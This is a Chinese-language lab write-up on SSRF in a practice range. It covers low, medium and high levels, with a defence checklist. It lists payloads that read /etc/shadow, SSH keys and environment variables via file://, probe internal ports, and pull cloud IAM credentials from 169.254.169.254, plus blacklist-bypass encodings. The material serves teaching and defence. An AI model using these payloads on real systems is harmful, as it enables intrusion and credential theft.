# SSRF（服务端请求伪造）Writeup

> 对应场景：`html/ssrf/low.php` / `medium.php` / `high.php`
>
> 攻击目标：`http://127.0.0.1:8090/internal/inner-service.php`（模拟的内网服务）
>
> 启动靶场时会同时起 8080（主靶场）和 8090（内网服务）两个端口 ——
> 因为 PHP 内置服务器是单进程的，服务端请求自己会死锁。

---

## 一、原理：一个「信任边界」问题

SSRF 的本质不是「发请求」，而是**服务端把它的网络位置借给了攻击者**。

```
                    ┌─────────────┐
   攻击者 ──请求──▶ │   服务端     │ ──请求──▶ 内网服务
   （外网）         │  （内层）    │          云元数据
                    └─────────────┘          只监听回环的服务
                          ↑
                    攻击者够不到这些目标，
                    但服务端够得到
```

所以 SSRF 的严重性**不取决于漏洞本身，而取决于服务端能访问到什么**：

| 服务端所处位置 | SSRF 的危害 |
|---|---|
| 普通外网服务器 | 探测内网、读本地文件 |
| 云主机 | **读取元数据接口 → 拿到云账号临时凭据 → 接管云资源** |
| 内网服务器 | 直接访问大量未授权内网服务 |

这也是为什么 SSRF 在现代渗透中地位很高 —— 它是「从外网打点」到「进入内网」的关键跳板。

---

## 二、本档的攻击目标

`/internal/inner-service.php` 模拟了一类非常常见的服务：

> **只有内网能访问，所以没做认证。**

这个服务的全部安全性建立在「外部访问不到」这个**假设**上。
SSRF 恰好就是专门打破这个假设的。

它的响应里有假的数据库连接串、Redis 地址、内部 API Token ——
用来具体化「拿到 SSRF 之后实际能捞到什么」。

## 三、low 档：无任何限制

### 3.1 漏洞代码

```php
$content = @file_get_contents($url, false, $context);
// $url 来自用户，协议不限、目标不限
```

### 3.2 利用一：访问内网服务

```
?url=http://127.0.0.1:8090/internal/inner-service.php
```

页面会原样返回内网服务的 JSON，包括：

```json
{
  "service": "internal-admin-api",
  "secret": "VULNLAB{ssrf_reached_internal_service}",
  "internal_resources": {
    "db_dsn": "mysql://app:Str0ngP@ss@10.0.0.12:3306/production",
    "api_token": "sk-internal-9f3a2b7c1d8e4f5a"
  }
}
```

**注意这一步的意义**：请求是从**服务器**发出的，不是从你的浏览器。
所以那道「内网服务对外不可达」的边界被绕过去了。

### 3.3 利用二：读本地文件（`file://` 协议）

```
?url=file:///C:/Windows/win.ini
```

`file_get_contents` 默认支持 `file://`，于是可以读服务器上的任意文件。

真实环境里这一步的目标通常是：

```
file:///etc/passwd                    Linux 用户列表
file:///etc/shadow                    密码哈希（如果有读权限）
file:///proc/self/environ             环境变量（常含密钥）
file:///var/www/html/config.php       应用配置（数据库密码）
file:///root/.ssh/id_rsa              SSH 私钥
file:///root/.bash_history            命令历史（常含明文密码）
```

**读配置文件往往是 SSRF 最高效的利用方式** —— 它直连拿凭据，不需要打内网。

### 3.4 利用三：探测内网端口

```
?url=http://127.0.0.1:6379/         Redis
?url=http://127.0.0.1:3306/         MySQL
?url=http://10.0.0.5:8080/          内网 Web 服务
```

根据响应时间、返回内容、错误信息，可以判断端口是否开放、服务是什么。

### 3.5 利用四：云元数据接口（最危险）

```
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

`169.254.169.254` 是各大云厂商的元数据服务地址。在云主机上访问它能拿到
**该实例绑定的 IAM 角色临时凭据** —— 攻击者据此可以调用云 API，
读取对象存储、甚至接管整个云账号。

这是近年来最严重的 SSRF 利用路径，CapCapital One 数据泄露事件（1 亿用户）
就是 SSRF + 元数据接口导致的。

**防御要点**：云环境应启用 **IMDSv2**（要求先取 token 再访问），
它能让大部分 SSRF 无法直接读取元数据。

## 四、medium 档：黑名单与绕过

### 4.1 漏洞代码

```php
$blacklist = ['127.0.0.1', '0.0.0.0', '192.168.', '10.', '172.16.', 'file://', ...];

foreach ($blacklist as $bad) {
    if (stripos($url, $bad) !== false) { /* 拦截 */ }
}
```

### 4.2 这个黑名单漏掉了什么

**它漏掉了 `localhost`。**

```
?url=http://localhost:8090/internal/inner-service.php
```

`localhost` 和 `127.0.0.1` 是同一个地址的两种写法，但字符串匹配只认得后者。

这不是我故意留的后门 —— 这是**真实世界最常见的疏漏类型**：
开发者想到了 `127.0.0.1`，忘了 `localhost`；想到了 `10.`，忘了 `172.16.`。

### 4.3 为什么字符串黑名单必然失败

同一个 IP 有无数种等价写法：

```
http://127.0.0.1/            标准写法       ← 黑名单认得
http://localhost/            hostname       ← 经常被漏掉
http://127.1/                省略段
http://0x7f000001/           十六进制
http://2130706433/           十进制整数
http://017700000001/         八进制
http://[::1]/                IPv6 回环
http://[::ffff:127.0.0.1]/   IPv4 映射的 IPv6
http://127.0.0.1.nip.io/     通配 DNS
http://attacker.com/         攻击者域名，A 记录指向 127.0.0.1
```

最后两条尤其关键：**它们连 IP 字面量都不是**，任何针对 IP 字符串的检查都拦不住。

### 4.4 ⚠️ 平台差异（本靶场实测）

**上面这些写法不是在所有系统上都有效。**

| 写法 | Linux | Windows |
|---|---|---|
| `127.0.0.1` | 可用 | 可用 |
| `localhost` | 可用 | 可用 |
| `127.1` | 可用 | **不可用** |
| `0x7f000001` | 可用 | **不可用** |
| `2130706433` | 可用 | **不可用** |
| `[::1]` | 可用 | 视配置 |

原因：Linux 的 `inet_aton` 支持这些历史写法，Windows 的解析器不支持。

**这个差异本身就是一个知识点**：绕过是否有效**取决于目标环境**。
真实渗透中，先判断目标系统类型，再决定试哪些写法 ——
盲试一堆 payload 既浪费时间又容易被 WAF 记录。

本靶场跑在 Windows 上，所以能稳定演示的绕过点是 `localhost`。

### 4.5 其他绕过思路

| 手法 | 原理 | 能绕过什么 |
|---|---|---|
| `localhost` | 等价写法 | 只拦 IP 的黑名单 |
| 域名指向内网 | 攻击者控制 DNS | **所有针对 IP 的检查** |
| 302 跳转 | 初始 URL 合法，跳转后到内网 | 只校验初始 URL 的实现 |
| DNS 重绑定 | 两次解析返回不同 IP | 校验与请求分离的实现 |
| URL 解析歧义 | `http://evil.com@127.0.0.1/` | 解析逻辑与校验逻辑不一致 |
| 进制/省略写法 | 见上表 | 字符串黑名单（平台相关） |

**结论与 SQL 注入、XSS 完全一致：黑名单的失败不是「写得不够努力」，
而是它要求你穷举一个根本无法穷举的集合。**

## 五、high 档：解析后校验

### 5.1 三层防护

```php
// ① 协议白名单
$scheme = strtolower(parse_url($url, PHP_URL_SCHEME));
if (!in_array($scheme, ['http', 'https'], true)) { /* 拒绝 */ }

// ② 解析出真实 IP，再判断网段
$resolvedIp = gethostbyname($host);
if (is_private_ip($resolvedIp)) { /* 拒绝 */ }

// ③ 用校验过的 IP 发请求（防 DNS 重绑定）
file_get_contents($pinnedUrlWithIp, false, $context);
```

**核心思路：判断「解析之后的 IP」，而不是「URL 字符串」。**

`gethostbyname` 会把所有等价写法（包括 `localhost`、攻击者域名）
统一解析成真实 IP，所以针对解析结果做判断能覆盖所有变形。

### 5.2 网段判断必须覆盖全

```php
$privateRanges = [
    ['0.0.0.0',     8],   // 本地网络
    ['10.0.0.0',    8],   // 私有
    ['100.64.0.0', 10],   // 运营商级 NAT
    ['127.0.0.0',   8],   // 回环
    ['169.254.0.0', 16],  // 链路本地 —— 云元数据接口在这一段！
    ['172.16.0.0', 12],   // 私有
    ['192.0.0.0',  24],   // IETF 保留
    ['192.168.0.0', 16],  // 私有
    ['198.18.0.0', 15],   // 基准测试
    ['224.0.0.0',   4],   // 组播
    ['240.0.0.0',   4],   // 保留
];
```

**漏掉任何一段都可能被利用** —— 尤其是 `169.254.0.0/16`
（云元数据）和 `127.0.0.0/8`（回环）。

还要处理 IPv6：`::1`、`::`、以及 IPv4 映射地址 `::ffff:127.0.0.1`。

### 5.3 ⚠️ DNS 重绑定：为什么必须有第 ③ 层

错误的写法：

```php
$ip = gethostbyname($host);      // 第一次解析：返回公网 IP，校验通过
if (is_private_ip($ip)) die();
file_get_contents($url);         // 第二次解析：DNS 返回 127.0.0.1
                                  // ↑ 请求打到了内网，校验形同虚设
```

攻击者只需要控制一个域名，把 A 记录 TTL 设为 0：
第一次查询返回公网 IP、第二次返回 `127.0.0.1`。

这叫 **TOCTOU**（Time-of-Check to Time-of-Use）——
**校验时看到的东西，和使用时看到的东西不是同一个。**

**正确做法：校验的是哪个 IP，请求就打到哪个 IP**，
把 URL 里的主机名替换成已校验的 IP（同时保留原始 `Host` 头）。

### 5.4 302 跳转绕过

如果客户端**跟随跳转**，攻击者可以让初始 URL 指向一个合法地址，
由那个地址返回 `302 Location: http://127.0.0.1/` —— 于是绕过了所有初始校验。

**修复**：不跟随跳转（`follow_location => 0`），
或者**对每一跳都重新校验**。

## 六、盲 SSRF 与有回显 SSRF

| 类型 | 特征 | 利用方式 |
|---|---|---|
| **有回显** | 响应内容返回给攻击者 | 直接读数据（本靶场就是这种） |
| **盲 SSRF** | 只返回成功/失败，无内容 | 靠时间差、错误信息、外带（OOB）判断 |

盲 SSRF 的常见利用手法：

- **时间差**：端口开放 → 快速失败；被防火墙丢包 → 超时。用响应时间判断。
- **错误信息差异**：连接被拒绝 vs 域名解析失败，错误类型不同。
- **外带（OOB）**：让服务端请求攻击者控制的服务器，从对方的访问日志里获取信息。
  例如 `gopher://` 构造 Redis 命令，把数据写到攻击者的 Web 服务。

**所以「没有回显」不等于「不可利用」** —— 这一点在评估 SSRF 危害时很重要。

## 七、防御清单

### 应用层

```
✅ 协议白名单（只允许 http/https），不用黑名单
✅ 解析出真实 IP 之后再校验，而不是匹配 URL 字符串
✅ 网段判断覆盖全：私有/回环/链路本地（云元数据）/保留/IPv6
✅ 用校验过的 IP 发起请求，防 DNS 重绑定（TOCTOU）
✅ 不跟随跳转，或对每一跳重新校验
✅ 限制响应大小与超时（防止被当成 DoS 跳板或内网扫描器）
✅ 统一出口代理：所有出站请求走一个受控的代理，在代理层做白名单

❌ 不要对 URL 做字符串黑名单
❌ 不要只校验初始 URL 就认为安全（跳转 / 重绑定）
❌ 不要让内网服务依赖「外部访问不到」这个假设
```

### 网络层（必须）

**应用层修得再好也可能被绕过，网络层是最后一道防线：**

```
✅ 让发起请求的服务运行在隔离网段，只放通真正需要的出口
✅ 云环境启用 IMDSv2（要求先取 token，能挡掉大部分 SSRF）
✅ 出站流量白名单：只允许访问特定的外部域名
✅ 内网服务该做鉴权就做鉴权 —— 不要依赖网络隔离
```

## 八、三个场景的横向对比

到这里，四个漏洞场景都完成了。把它们放在一起看：

| 场景 | 数据被当成了什么 | 根因 | 修复方向 |
|---|---|---|---|
| SQL 注入 | SQL 语法 | 拼接 | 参数化（数据不参与解析） |
| XSS | HTML 语法 | 拼接 | 输出编码（数据不参与解析） |
| 文件上传 | 可执行代码 | 未校验 + 原名保存 | 白名单 + 内容检查 + 禁执行 |
| **SSRF** | **一个网络位置** | **未校验目标地址** | **解析后校验 + 网络层隔离** |

前三个是「数据被当成了代码」，SSRF 稍有不同 —— 它是「**服务端的权限被借用了**」。

但防御思路一致：**不要试图过滤危险的东西，而是让危险的东西失去意义。**

- SQL / XSS：让数据不参与语法解析
- 文件上传：让可执行内容无法被执行
- **SSRF：让服务端只去它该去的地方**
